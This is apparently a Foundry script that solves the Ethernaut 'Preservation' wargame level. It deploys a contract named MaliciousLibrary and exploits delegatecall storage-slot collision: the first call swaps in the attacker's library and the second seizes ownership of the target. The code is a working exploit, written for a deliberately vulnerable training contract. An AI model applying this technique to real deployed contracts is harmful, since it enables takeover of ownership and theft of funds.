pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Preservation} from "../src/Preservation.sol";
import {console} from "forge-std/console.sol";


contract script_Preservation is Script
{
    function run() external
    {
        vm.startBroadcast();

        address preservationAddr; // instance address

        Preservation preservation = Preservation(preservationAddr);

        MaliciousLibrary malLib = new MaliciousLibrary();
        address malLibAddr = address (malLib);

        preservation.setFirstTime(uint256(uint160(malLibAddr)));
// calling setSecondTime has the same effect as they both modify storage slot 0
        console.log("set  ''time''  to: ", preservation.timeZone1Library());

        preservation.setFirstTime(uint256(uint160(msg.sender)));

        console.log("owner:", preservation.owner()); // assert you passed ;_)

        vm.stopBroadcast();
    }
}

// Simple library contract to set the time (not time;)
contract MaliciousLibrary {
    // stores a timestamp
    uint256 storedTime;
    address placeholder;
    address owner; // slot 2

    function setTime(uint256 newOwnerAddrUint) public
    {
        owner = address(uint160(newOwnerAddrUint));
    }
}